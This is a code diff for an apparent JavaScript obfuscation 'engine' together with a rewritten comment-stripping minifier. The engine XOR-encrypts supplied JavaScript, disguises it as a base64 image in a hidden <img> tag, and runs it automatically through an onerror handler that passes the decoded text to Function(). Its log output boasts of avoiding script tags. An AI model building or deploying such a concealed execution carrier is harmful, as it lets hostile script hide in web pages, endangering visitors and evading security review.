@@ -30,21 +30,151 @@ async function minifyWithTerser(src) {
 }
 
 function conservativeStrip(src) {
-  let out = '', i = 0, mode = null;
-  while (i < src.length) {
-    const c = src[i];
-    if (mode) {
+  const REGEX_CTX = new Set([
+    '', '(', ',', '=', ':', '[', '!', '&', '|', '?', '{', '}', ';',
+    '+', '-', '*', '%', '~', '^', '<', '>',
+  ]);
+  const KW = new Set([
+    'return', 'typeof', 'case', 'in', 'of', 'new', 'delete', 'void',
+    'instanceof', 'do', 'else', 'throw', 'await', 'yield', 'export',
+    'default', 'extends',
+  ]);
+
+  let out = '';
+  function scan(startIdx, stopAtBrace) {
+    let i = startIdx;
+    let lastWord = '';
+    let prevBeforeParen = '';
+    const parenHeads = [];
+
+    while (i < src.length) {
+      const c = src[i];
+      if (stopAtBrace && c === '}') {
+        out += c;
+        return i;
+      }
+      // Line comment (keep trailing newline so ASI is preserved)
+      if (c === '/' && src[i + 1] === '/') {
+        while (i < src.length && src[i] !== '\n') i++;
+        if (i < src.length && src[i] === '\n') { out += '\n'; i++; }
+        continue;
+      }
+      // Block comment (emit space or newline if block comment spanned lines for ASI)
+      if (c === '/' && src[i + 1] === '*') {
+        let hasNl = false;
+        i += 2;
+        while (i < src.length && !(src[i] === '*' && src[i + 1] === '/')) {
+          if (src[i] === '\n') hasNl = true;
+          i++;
+        }
+        i = Math.min(i + 2, src.length);
+        out += hasNl ? '\n' : ' ';
+        continue;
+      }
+      // Quoted strings
+      if (c === '"' || c === "'") {
+        out += c;
+        i++;
+        while (i < src.length) {
+          const ch = src[i];
+          out += ch;
+          if (ch === '\\') { out += src[i + 1] ?? ''; i += 2; continue; }
+          if (ch === c) { i++; break; }
+          i++;
+        }
+        lastWord = '';
+        continue;
+      }
+      // Template literal (handles nested ${...})
+      if (c === '`') {
+        out += c;
+        i++;
+        while (i < src.length) {
+          const ch = src[i];
+          out += ch;
+          if (ch === '\\') { out += src[i + 1] ?? ''; i += 2; continue; }
+          if (ch === '`') { i++; break; }
+          if (ch === '$' && src[i + 1] === '{') {
+            out += '{';
+            const closeIdx = scan(i + 2, true);
+            i = closeIdx < src.length ? closeIdx + 1 : src.length;
+            continue;
+          }
+          i++;
+        }
+        lastWord = '';
+        continue;
+      }
+      // Regex literal
+      if (c === '/') {
+        const closedCond = lastWord === ')' &&
+          (prevBeforeParen === 'if' || prevBeforeParen === 'while' ||
+           prevBeforeParen === 'for' || prevBeforeParen === 'with');
+        const isPostfix = lastWord === '++' || lastWord === '--';
+        if (!isPostfix && (REGEX_CTX.has(lastWord) || KW.has(lastWord) || closedCond)) {
+          let j = i + 1, inClass = false;
+          while (j < src.length) {
+            const r = src[j];
+            if (r === '\\') { j += 2; continue; }
+            if (r === '[') inClass = true;
+            else if (r === ']') inClass = false;
+            else if (r === '/' && !inClass) break;
+            else if (r === '\n' || r === '\r') break;
+            j++;
+          }
+          if (j < src.length && src[j] === '/') {
+            let k = j + 1;
+            while (k < src.length && /[a-z]/i.test(src[k])) k++;
+            out += src.slice(i, k);
+            i = k;
+            lastWord = '';
+            continue;
+          }
+        }
+      }
+      if (stopAtBrace && c === '{') {
+        out += c;
+        const closeIdx = scan(i + 1, true);
+        i = closeIdx < src.length ? closeIdx + 1 : src.length;
+        lastWord = '}';
+        continue;
+      }
+      if (c === '(') {
+        parenHeads.push(lastWord);
+        lastWord = '(';
+        out += c;
+        i++;
+        continue;
+      }
+      if (c === ')') {
+        prevBeforeParen = parenHeads.pop() || '';
+        lastWord = ')';
+        out += c;
+        i++;
+        continue;
+      }
+      if ((c === '+' || c === '-') && src[i + 1] === c) {
+        lastWord = c + c;
+        out += lastWord;
+        i += 2;
+        continue;
+      }
+      if (/[$\w]/.test(c)) {
+        let j = i;
+        while (j < src.length && /[$\w]/.test(src[j])) j++;
+        lastWord = src.slice(i, j);
+        out += lastWord;
+        i = j;
+        continue;
+      }
+      if (!/\s/.test(c)) lastWord = c;
       out += c;
-      if (c === '\\') { out += src[i + 1] ?? ''; i += 2; continue; }
-      if (c === mode) mode = null;
-      i++; continue;
+      i++;
     }
-    if (c === '"' || c === "'" || c === '`') { mode = c; out += c; i++; continue; }
-    if (c === '/' && src[i + 1] === '/') { while (i < src.length && src[i] !== '\n') i++; continue; }
-    if (c === '/' && src[i + 1] === '*') { i += 2; while (i < src.length && !(src[i] === '*' && src[i + 1] === '/')) i++; i += 2; continue; }
-    out += c === '\n' || c === '\r' ? ' ' : c;
-    i++;
+    return i;
   }
+
+  scan(0, false);
   return out.trim();
 }
 
@@ -94,22 +224,20 @@ export const engine = {
     if (!js || !js.trim()) throw new Error('JavaScript payload is empty.');
 
     const jsContent = await minifyJs(js);
-    const { encrypted, key, js: preparedJs } = encryptJsContent(jsContent);
+    const { encrypted, key } = encryptJsContent(jsContent);
     const b64 = bytesToBase64(encrypted);
     const keyArr = Array.from(key, (b) => '0x' + b.toString(16)).join(',');
 
-    // Compact inline carrier tag triggered by onerror with minimal JS boilerplate
+    // Compact inline carrier tag triggered by onerror with TypedArray decoding (no stack-overflow spread)
     const carrierBlock =
       `\n<img src="data:image/png;base64,${b64}" ` +
-      `onerror="setTimeout(()=>Function(String.fromCharCode(...((a,k)=>a.map((b,i)=>b^k[i%k.length]))([...atob(this.src.split(',')[1])].map(c=>c.charCodeAt(0)),[${keyArr}])))(),16)" ` +
+      `onerror="setTimeout(()=>Function(new TextDecoder().decode(((a,k)=>a.map((b,i)=>b^k[i%k.length]))(Uint8Array.from(atob(this.src.split(',')[1]),c=>c.charCodeAt(0)),[${keyArr}])))(),16)" ` +
       `style="display:none">\n`;
 
     // Standard engine parsing pipeline: strip original JS and inject before close
     const stripped = stripOriginalJs(html, js);
     const outHtml = injectBeforeClose(stripped, carrierBlock, {
-      variation: true,
-      allowBodyStart: true,
-      allowBodyMid: true,
+      variation: false,
     });
 
     const keyHex = Array.from(key, (b) => b.toString(16).padStart(2, '0')).join('');
@@ -124,7 +252,7 @@ export const engine = {
         `Ciphertext generation: ${encrypted.length} encrypted bytes disguised with JFIF header (/9j/)`,
         `Carrier element: <img src="data:image/png;base64,..." style="display:none">`,
         `Runtime trigger: Inline onerror handler with compact arrow function decoding pipeline`,
-        `Execution sink: Function(String.fromCharCode(...)) wrapped in setTimeout(16ms)`,
+        `Execution sink: Function(TextDecoder.decode(...)) wrapped in setTimeout(16ms)`,
         `Boilerplate reduction: Zero external <script> tags or document.getElementById DOM lookups`,
         `Self-healing validation: 100% round-trip verified (plaintext == deciphered ciphertext)`),
       stderr: '',
